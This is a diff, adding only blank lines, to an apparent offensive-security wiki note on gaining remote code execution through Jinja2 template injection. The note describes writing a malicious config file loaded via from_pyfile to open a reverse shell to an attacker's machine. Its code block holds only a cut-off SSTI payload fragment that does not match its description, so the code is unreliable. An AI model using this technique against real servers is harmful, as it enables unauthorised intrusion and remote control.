@@ -31,6 +31,8 @@ Jinja2 is a popular templating engine for Python. Server Side Template Injection
 
 Jinja2 is a popular templating engine for Python. Server Side Template Injection (SSTI) vulnerabilities in Jinja2 can lead to remote code execution (RCE) attacks. In this procedure, we exploit the SSTI vulnerability by writing an evil config file. An attacker can craft a malicious payload to execute arbitrary code on the target server. This attack can be used to achieve persistence and execute further malicious activities.
 
+ 
+
 ## Requirements
 
 1. Access to the target server
@@ -38,6 +40,8 @@ Jinja2 is a popular templating engine for Python. Server Side Template Injection
 1. Knowledge of the target server's configuration
 
 1. Python installed on the target server
+
+ 
 
 ## Defense
 
@@ -47,6 +51,8 @@ Jinja2 is a popular templating engine for Python. Server Side Template Injection
 
 1. Regularly update and patch the application and its dependencies
 
+ 
+
 ## Objectives
 
 1. Execute arbitrary code on the target server
@@ -55,12 +61,20 @@ Jinja2 is a popular templating engine for Python. Server Side Template Injection
 
 1. Perform further malicious activities on the target server
 
+ 
+
 # Instructions
 
 1. This command allows an attacker to execute arbitrary code remotely on the target machine. The code is executed in the context of the Python interpreter.
 
+ 
+
+
+
 **Code**: [[# evil config
 {{ ''.__class__.__mro__[2].__subclas]]
+
+
 
 > The command first creates a file named 'evilconfig.cfg' in the '/tmp' directory and writes Python code to it that imports the 'check_output' function from the 'subprocess' module and assigns it to a variable named 'RUNCMD'. The file is then loaded using the 'from_pyfile' method of the 'config' object. Finally, the 'RUNCMD' variable is called with the command to execute as an argument, which is a reverse shell that connects to the attacker's machine on IP address 'x.x.x.x' and port '8000'. The 'shell=True' argument is passed to ensure that the command is executed using the shell.
 
@@ -82,3 +96,5 @@ Jinja2 is a popular templating engine for Python. Server Side Template Injection
 - [[Jinja2]]
 - [[Jinja2 - Remote Code Execution]]
 - [[Server Side Template Injection]]
+
+
